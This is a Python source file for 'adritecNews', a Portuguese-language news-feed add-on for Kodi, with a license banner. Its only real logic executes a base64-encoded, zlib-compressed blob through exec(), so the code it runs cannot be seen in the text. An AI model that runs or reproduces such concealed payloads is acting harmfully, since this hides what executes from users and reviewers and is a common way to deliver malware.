#!/usr/bin/python
# -*- coding: utf-8 -*-

#                 -*- adritecNews -*-                      #
#----------------------------------------------------------#
#     ADD-ON FEED NEWS PARA O KODI XBMC - VERSÃO: 1.0.0    #
#----------------------------------------------------------#
# KODI: GPL https://pt.wikipedia.org/wiki/Kodi             #   
# KODI WIKI: https://kodi.wiki/view/Main_Page              #
# PROGRAMAÇÃO: PYTHON: https://docs.python.org/2/tutorial/ #
# CONTATO: adritec_dados@yahooo.com.br                     #
# CANAL: YouTube.com/adritecnews                           # 
# SITE: httP://adritecnews.com                             #
#----------------------------------------------------------#
#     TODOS OS DIREITOS RESERVADOS: adritecNews 2018       #
#                                                          #
#      Este trabalho está licenciado sob uma Licença       #
#Creative Commons Atribuição-NãoComercial-SemDerivações 4.0# 
#      Internacional. Para ver uma cópia desta licença,    # 
# visite http://creativecommons.org/licenses/by-nc-nd/4.0/ #
#       'Atribuição-Não-Comercial-SemDerivativos 4.0       # 
#           Internacional (CC BY-NC-ND 4.0)'               #
#----------------------------------------------------------#
#                "ATENÇÃO INTERNAUTAS"                     #
#                                                          #
#      FICA PROIBIDO CÓPIA, MODIFICAÇÃO, DIVULGAÇÃO        #
#                SEM MINHA ALTORIZAÇÃO                     #
# Add-on desenvolvido para trazer informação para Inscrito #
#          e não inscritos do canal adritec News.          #
#----------------------------------------------------------#

import xbmc, xbmcaddon, xbmcgui
import zlib
import base64

def decode_base64( b64string ):
    decoded_data = base64.b64decode( b64string )
    return zlib.decompress( decoded_data , -15)

def base64_encode( string_val ):
    zlibbed_str = zlib.compress( string_val )
    compressed_string = zlibbed_str[2:-4]
    return base64.b64encode( compressed_string )
	
exec(decode_base64('pZBBasMwEEX3PsVQArEhUfaBQpvUlNBiQxy6MSbI1qCokTWJbLfpeXqUXqyysVs32260+PP15/0RimuScAuXvCxko9hDJ/iBdy8EmZ2qNbrpTbqOn+MtCBISba4bzNJVxoVVNRbpYpWli86Q9T6LojVE+F61U+hlSbrT42j858brg/ZJuNttosek5+EtAutAHNC1idEJTYJ1rYys/AA8r9C8qiB+8oOlBwCiq8Lo6P92mU2jr08CgeqC7oUKBzay3Miu1iZK1tvwJdzOk3DMCYag4IZr+N81himbzqZOTvCVQ1NCQZrnjkKQncG54frcoB1WaSUP9UmZY/bmSlmYTCY/MW1mG3XdA+clV3q8cTnEcZdfcqvMmHwv3O7q7oMfiFhBJcvtX9ygvSpeVO0H3w=='))